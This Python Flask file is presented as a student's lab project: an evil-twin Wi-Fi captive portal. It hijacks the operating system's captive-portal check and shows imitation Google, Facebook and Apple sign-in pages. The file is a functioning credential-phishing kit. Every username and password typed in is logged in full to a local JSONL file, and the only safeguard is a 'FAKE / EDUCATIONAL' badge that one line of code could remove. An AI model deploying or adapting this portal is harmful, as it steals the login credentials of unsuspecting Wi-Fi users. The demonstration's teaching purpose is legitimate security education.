#!/usr/bin/env python3
"""AL-GHUL evil-twin captive portal with social-login credential capture.

LAB / EDUCATIONAL USE ONLY. CSDA final project (RU). Runs on the
gateway laptop behind the student's own evil twin, cloning HER OWN Kaffi_FRI, with
HER OWN phone/tablet as the only client, on an isolated lab network.

What it demonstrates
  The richest thing an evil twin gets is not decrypted traffic, it is the password
  the victim TYPES. Phones probe for a walled garden; we answer the probe with a
  redirect, the OS pops a "Sign in to Wi-Fi" sheet, and the splash offers the
  familiar "Continue with Google / Facebook / Apple" buttons. Tapping one shows a
  provider-styled sign-in. Whatever is typed is captured here. No decryption, no
  exploit: the victim hands it over because the page looks routine.

Anti-misuse markers (deliberate, do not remove)
  Every page carries an always-visible "FAKE / EDUCATIONAL LAB DEMO - NOT A REAL
  LOGIN" badge. The styling is a recognisable facsimile, NOT a pixel-perfect clone,
  and it is never served from a real provider domain. The badge is what keeps this
  a teaching artifact instead of a deployable phishing kit. That distinction is the
  whole point of the ethics section of the report.

Evidence   experiments/portal-creds.jsonl   (full record, local only)
Console    prints MASKED credentials, safe to project on a screen.

Run:  python portal_social.py --port 80
The twin's DNS points the OS probe domains + the login host at this server.
"""
from __future__ import annotations
import argparse, json, time
from pathlib import Path
from flask import Flask, request, redirect, Response

app = Flask(__name__)
EVIDENCE = Path(__file__).resolve().parent.parent / "experiments" / "portal-creds.jsonl"
# Shared with dns_helper.py --captive: once this flag exists, the DNS stops
# redirecting the OS probe domains, so the phone's next check passes and it gets
# real internet. Dropping it here = "victim signed in, now let them through".
UNLOCK_FLAG = Path(__file__).resolve().parent / "portal-unlocked.flag"

# Always-visible educational marker injected into every page (fixed corner badge).
EDU_BADGE = """
<style>
 .edu-badge{position:fixed;right:10px;bottom:10px;z-index:99999;max-width:260px;
   background:#b00020;color:#fff;font:600 11px/1.35 -apple-system,Segoe UI,Roboto,sans-serif;
   padding:8px 11px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.35);text-align:left}
 .edu-badge b{display:block;font-size:12px;letter-spacing:.3px;margin-bottom:2px}
 @media print{.edu-badge{position:static}}
</style>
<div class="edu-badge"><b>&#9888; FAKE &mdash; EDUCATIONAL LAB DEMO</b>
 Evil-twin security demonstration (CSDA / RU). This is NOT a real login. Do not
 enter a real password.</div>
"""

# ---- Splash: the "Sign in to Wi-Fi" sheet with social-login buttons ----------
SPLASH_PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Kaffi_FRI &middot; Wi-Fi sign in</title><style>
 *{box-sizing:border-box}
 body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f2f2f7;margin:0;
   min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1c1c1e}
 .card{background:#fff;max-width:380px;width:92%;padding:30px 26px;border-radius:16px;
   box-shadow:0 1px 4px rgba(0,0,0,.12)}
 .wifi{width:46px;height:46px;display:block;margin:0 auto 10px}
 h1{font-size:20px;margin:0 0 2px;text-align:center}
 .sub{color:#8e8e93;font-size:13px;margin:0 0 22px;text-align:center}
 .btn{display:flex;align-items:center;gap:12px;width:100%;margin:10px 0;padding:12px 14px;
   border:1px solid #dadce0;border-radius:10px;background:#fff;font-size:15px;font-weight:600;
   color:#3c4043;text-decoration:none;cursor:pointer}
 .btn:active{background:#f7f8f8}
 .btn svg,.btn img{width:20px;height:20px;flex:0 0 20px}
 .btn.fb{background:#1877f2;color:#fff;border-color:#1877f2}
 .btn.ap{background:#000;color:#fff;border-color:#000}
 .or{color:#aeaeb2;font-size:12px;text-align:center;margin:18px 0 4px}
 .foot{color:#aeaeb2;font-size:11px;text-align:center;margin-top:18px}
</style></head><body>
 <form class=card>
  <svg class=wifi viewBox="0 0 24 24" fill="#007aff"><path d="M12 18a2 2 0 100 4 2 2 0 000-4zm0-5c-1.9 0-3.6.8-4.9 2l1.4 1.4A5 5 0 0112 15a5 5 0 013.5 1.4L16.9 15A6.9 6.9 0 0012 13zm0-5c-3.3 0-6.3 1.3-8.5 3.5L4.9 11A10 10 0 0112 8a10 10 0 017.1 3L20.5 9.5A12 12 0 0012 6z"/></svg>
  <h1>Sign in to Wi-Fi</h1>
  <p class=sub>Kaffi_FRI &middot; Free guest access</p>

  <a class="btn" href="/google">
   <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.6l6.7-6.7C35.9 2.4 30.5 0 24 0 14.6 0 6.4 5.4 2.5 13.3l7.8 6.1C12.2 13.2 17.6 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.4c-.5 2.9-2.1 5.3-4.6 7l7.1 5.5c4.2-3.9 6.7-9.6 6.7-16.5z"/><path fill="#FBBC05" d="M10.3 28.6c-.5-1.4-.8-3-.8-4.6s.3-3.2.8-4.6l-7.8-6.1C.9 16.5 0 20.1 0 24s.9 7.5 2.5 10.7l7.8-6.1z"/><path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.1-5.5c-2 1.3-4.5 2.1-8.8 2.1-6.4 0-11.8-3.7-13.7-8.9l-7.8 6.1C6.4 42.6 14.6 48 24 48z"/></svg>
   Continue with Google</a>

  <a class="btn fb" href="/facebook">
   <svg viewBox="0 0 24 24" fill="#fff"><path d="M24 12a12 12 0 10-13.9 11.9v-8.4H7v-3.5h3.1V9.4c0-3 1.8-4.7 4.6-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.9v2.2h3.4l-.5 3.5h-2.9v8.4A12 12 0 0024 12z"/></svg>
   Continue with Facebook</a>

  <a class="btn ap" href="/apple">
   <svg viewBox="0 0 24 24" fill="#fff"><path d="M16.4 12.8c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.9-3.5.9s-1.8-.9-3-.8c-1.5 0-2.9.9-3.7 2.3-1.6 2.7-.4 6.7 1.1 8.9.7 1.1 1.6 2.3 2.8 2.2 1.1 0 1.5-.7 2.9-.7s1.7.7 2.9.7 2-1.1 2.7-2.1c.8-1.2 1.2-2.3 1.2-2.4-.1 0-2.3-.9-2.3-3.6zM14.2 5.8c.6-.8 1-1.8.9-2.8-.9 0-1.9.6-2.5 1.3-.6.7-1 1.7-.9 2.7 1 .1 1.9-.5 2.5-1.2z"/></svg>
   Continue with Apple</a>

  <p class=or>or</p>
  <a class="btn" href="/wifi" style="justify-content:center">Use a Wi-Fi guest code</a>
  <p class=foot>By connecting you agree to the terms of use.</p>
 </form>
 __EDU__
</body></html>"""

# ---- Google-styled sign-in facsimile (watermarked) ---------------------------
GOOGLE_PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Sign in - Google accounts</title><style>
 *{box-sizing:border-box}
 body{font-family:Roboto,arial,sans-serif;background:#fff;margin:0;color:#202124;
   min-height:100vh;display:flex;align-items:center;justify-content:center}
 .card{border:1px solid #dadce0;border-radius:8px;max-width:450px;width:94%;
   padding:40px 40px 36px}
 .g{width:40px;height:40px;display:block;margin:0 auto 14px}
 h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 6px}
 .sub{font-size:16px;text-align:center;margin:0 0 30px}
 label{display:block;font-size:12px;color:#5f6368;margin:16px 0 4px}
 input{width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
 input:focus{outline:none;border-color:#1a73e8;border-width:2px;padding:12px}
 .row{display:flex;align-items:center;justify-content:space-between;margin-top:30px}
 .mk{background:none;border:0;color:#1a73e8;font-weight:600;font-size:14px;cursor:pointer}
 .next{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;
   font-size:14px;font-weight:600;cursor:pointer}
</style></head><body>
 <form class=card method=post action="/login">
  <input type=hidden name=provider value=google>
  <svg class=g viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.6l6.7-6.7C35.9 2.4 30.5 0 24 0 14.6 0 6.4 5.4 2.5 13.3l7.8 6.1C12.2 13.2 17.6 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.4c-.5 2.9-2.1 5.3-4.6 7l7.1 5.5c4.2-3.9 6.7-9.6 6.7-16.5z"/><path fill="#FBBC05" d="M10.3 28.6c-.5-1.4-.8-3-.8-4.6s.3-3.2.8-4.6l-7.8-6.1C.9 16.5 0 20.1 0 24s.9 7.5 2.5 10.7l7.8-6.1z"/><path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.1-5.5c-2 1.3-4.5 2.1-8.8 2.1-6.4 0-11.8-3.7-13.7-8.9l-7.8 6.1C6.4 42.6 14.6 48 24 48z"/></svg>
  <h1>Sign in</h1><p class=sub>to continue to Gmail</p>
  <label>Email or phone</label>
  <input name=username type=email autocomplete=username required autofocus>
  <label>Enter your password</label>
  <input name=password type=password autocomplete=current-password required>
  <div class=row><button type=button class=mk onclick="alert('Demo only.')">Create account</button>
   <button class=next>Sign in</button></div>
 </form>
 __EDU__
</body></html>"""

# ---- Facebook / Apple facsimiles (same capture, provider-tagged) -------------
FACEBOOK_PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Log in to Facebook</title>
<style>*{box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;margin:0;
 min-height:100vh;display:flex;align-items:center;justify-content:center}
 .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);max-width:396px;width:94%;padding:26px 20px}
 .logo{color:#1877f2;font-size:40px;font-weight:700;text-align:center;margin:0 0 16px}
 input{width:100%;padding:14px;margin:7px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px}
 .btn{width:100%;padding:13px;margin-top:6px;background:#1877f2;color:#fff;border:0;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
</style></head><body>
 <form class=card method=post action="/login"><input type=hidden name=provider value=facebook>
  <div class=logo>facebook</div>
  <input name=username type=text placeholder="Email address or phone number" required autofocus>
  <input name=password type=password placeholder="Password" required>
  <button class=btn>Log in</button></form>
 __EDU__
</body></html>"""

APPLE_PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Sign in with Apple</title>
<style>*{box-sizing:border-box}body{font-family:-apple-system,Helvetica,Arial,sans-serif;background:#fff;margin:0;
 min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1d1d1f}
 .card{max-width:360px;width:92%;text-align:center;padding:30px 24px}
 .apple{font-size:42px;margin:0 0 6px}
 h1{font-size:19px;font-weight:600;margin:0 0 24px}
 input{width:100%;padding:13px;margin:8px 0;border:1px solid #d2d2d7;border-radius:10px;font-size:16px}
 .btn{width:100%;padding:12px;margin-top:10px;background:#000;color:#fff;border:0;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body>
 <form class=card method=post action="/login"><input type=hidden name=provider value=apple>
  <div class=apple>&#63743;</div><h1>Sign in with Apple ID</h1>
  <input name=username type=email placeholder="Apple ID" required autofocus>
  <input name=password type=password placeholder="Password" required>
  <button class=btn>Sign In</button></form>
 __EDU__
</body></html>"""

DONE_PAGE = """<!doctype html><meta charset=utf-8><title>Connected</title>
<body style="font-family:-apple-system,Segoe UI,sans-serif;text-align:center;padding-top:70px;color:#1c1c1e">
<h2>You are connected.</h2><p>You can return to your browser.</p>__EDU__</body>"""

PROBE_PATHS = {"/generate_204", "/gen_204", "/hotspot-detect.html",
               "/connecttest.txt", "/ncsi.txt", "/success.txt", "/canonical.html"}


def page(html: str) -> Response:
    return Response(html.replace("__EDU__", EDU_BADGE), mimetype="text/html")


def mask(secret: str) -> str:
    if not secret:
        return "(empty)"
    return secret[0] + "*" * (len(secret) - 1) + f" (len {len(secret)})"


@app.post("/login")
def login():
    user = request.form.get("username", "")
    pw = request.form.get("password", "")
    provider = request.form.get("provider", "wifi")
    rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "ip": request.remote_addr,
           "provider": provider, "ua": request.headers.get("User-Agent", ""),
           "username": user, "password": pw}
    EVIDENCE.parent.mkdir(parents=True, exist_ok=True)
    with EVIDENCE.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec) + "\n")
    # Masked on screen so a projected terminal never shows the live password.
    print(f"[CAPTURED] {request.remote_addr}  via={provider}  user={user!r}  pass={mask(pw)}")
    # Let the victim through: drop the unlock flag so the DNS stops redirecting and
    # the phone's next connectivity check passes (real internet from here on).
    try:
        UNLOCK_FLAG.write_text(time.strftime("%Y-%m-%dT%H:%M:%S"))
    except OSError:
        pass
    return page(DONE_PAGE)


@app.get("/reset")
def reset():
    # Re-lock for another demo run: the sheet will pop again on the next check.
    try:
        UNLOCK_FLAG.unlink()
    except FileNotFoundError:
        pass
    return page(DONE_PAGE.replace("You are connected.", "Portal re-armed (locked)."))


@app.get("/google")
def google():
    return page(GOOGLE_PAGE)


@app.get("/facebook")
def facebook():
    return page(FACEBOOK_PAGE)


@app.get("/apple")
def apple():
    return page(APPLE_PAGE)


@app.get("/wifi")
def wifi():
    # the plain guest-code variant reuses the Google-less generic splash login
    return page(GOOGLE_PAGE.replace("value=google", "value=wifi")
                .replace("to continue to Gmail", "Kaffi_FRI guest access"))


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    # OS captive-portal probes: redirect so the sign-in sheet appears on its own.
    if request.path in PROBE_PATHS or request.path.endswith("generate_204"):
        return redirect("http://kaffi-fri.login/", code=302)
    return page(SPLASH_PAGE)


def main():
    ap = argparse.ArgumentParser(description="AL-GHUL social-login captive portal (lab only)")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=80)
    args = ap.parse_args()
    print(f"[*] social captive portal on {args.host}:{args.port}")
    print(f"[*] evidence -> {EVIDENCE}")
    print("[*] EDUCATIONAL LAB DEMO - every page carries a FAKE/NOT-REAL badge")
    app.run(host=args.host, port=args.port, threaded=True)


if __name__ == "__main__":
    main()
